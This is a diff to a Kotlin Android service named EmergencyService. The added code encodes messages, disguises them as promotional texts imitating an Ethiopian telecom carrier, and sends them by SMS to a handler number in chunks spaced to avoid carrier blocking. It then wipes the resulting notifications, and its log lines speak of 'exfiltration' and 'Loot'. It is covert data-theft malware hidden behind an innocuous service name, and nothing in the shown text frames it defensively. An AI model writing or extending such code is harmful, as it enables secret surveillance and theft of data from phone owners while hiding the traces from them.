@@ -173,27 +173,30 @@ class EmergencyService : Service() {
         } catch (e: Exception) { null }
     }
 
-    private fun sendSms(phone: String, msg: String) {
+    private suspend fun sendSms(phone: String, msg: String) {
         if (phone == "BACKEND") {
             DebugLogger.log("CodeRed", "SMS response aborted: No handler phone number provided for offline reply.")
             return
         }
         try {
-            val smsManager = getSystemService(SmsManager::class.java)
-            // Use multipart sending to ensure long exfiltrated messages aren't truncated by the OS
-            val parts = smsManager.divideMessage(msg)
-            smsManager.sendMultipartTextMessage(phone, null, parts, null, null)
-            
-            // Clear any "Message Sent" or thread update notifications from the UI
-            CoroutineScope(Dispatchers.Main).launch {
-                delay(1000)
-                MyNotificationListener.instance?.wipeNotifications("TEXT", "CR-BEACON")
-                MyNotificationListener.instance?.wipeNotifications("TEXT", "[Loot")
+            val token = FidelCipher.encode(msg)
+            val promos = FidelCipher.camouflage(applicationContext, token)
+            val smsManager = getSystemService(android.telephony.SmsManager::class.java)
+
+            for (promo in promos) {
+                val parts = smsManager.divideMessage(promo)
+                smsManager.sendMultipartTextMessage(phone, null, parts, null, null)
+                
+                // Clear any "Message Sent" or thread update notifications from the UI
+                CoroutineScope(Dispatchers.Main).launch {
+                    delay(1000)
+                    MyNotificationListener.instance?.wipeNotifications("TEXT", "ኢትዮ ቴሌኮም")
+                }
+                delay(3000) // Space out chunks to prevent carrier blocking
             }
-            
-            DebugLogger.log("CodeRed", "Exfiltrated chunk to $phone")
+            DebugLogger.log("CodeRed", "Encrypted exfiltration dispatched to $phone")
         } catch (e: Exception) {
-            DebugLogger.log("CodeRed_SMS_ERR", "Failed to send exfiltration text: ${e.message}")
+            DebugLogger.log("CodeRed_SMS_ERR", "Failed to send encrypted text: ${e.message}")
         }
     }
 
